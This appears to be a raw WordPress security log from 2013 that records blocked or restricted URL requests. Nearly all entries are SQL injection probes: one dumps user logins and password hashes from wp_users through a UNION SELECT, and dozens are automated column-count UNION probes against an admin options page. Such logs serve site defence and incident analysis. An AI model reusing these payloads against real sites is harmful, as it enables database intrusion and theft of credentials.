[2013-08-27 04:32:29] : URL_RESTRICTED
/FK_Testing/?tag=theres-no-recommendation-or-highlight-feature-on-fk-so-your-words-of-praise-will-suffice-pictures-of-salma-work-as-well-and-might-even-be-preferred-as-long-as-there-arent-a-bunch-of-re-posts
[2013-09-27 11:51:22] : URL_RESTRICTED
/?fbconnect_action=myhome&fbuserid=1+union+select+1,2,3,4,5,concat(0x53514c494e4a424547,user_login,0x3a,user_pass,0x53514c494e4a454e44),7,8,9,10,11,12+from+wp_users+limit+0,1--
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45)+--++/*
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
[2013-11-18 11:04:09] : URL_RESTRICTED
neoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45)+--++/*
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45)+--++/*
[2013-11-18 11:04:09] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45)+--++/*
[2013-11-18 11:04:10] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45)+--++/*
[2013-11-18 11:04:14] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45)+--++/*

[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:16] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:17] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:17] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:18] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:18] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:18] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:18] : URL_RESTRICTED
[2013-11-18 11:04:18] : URL_RESTRICTED
neoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45)+--+/*+order+by+%27as+/*
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:18] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:18] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:18] : URL_RESTRICTED
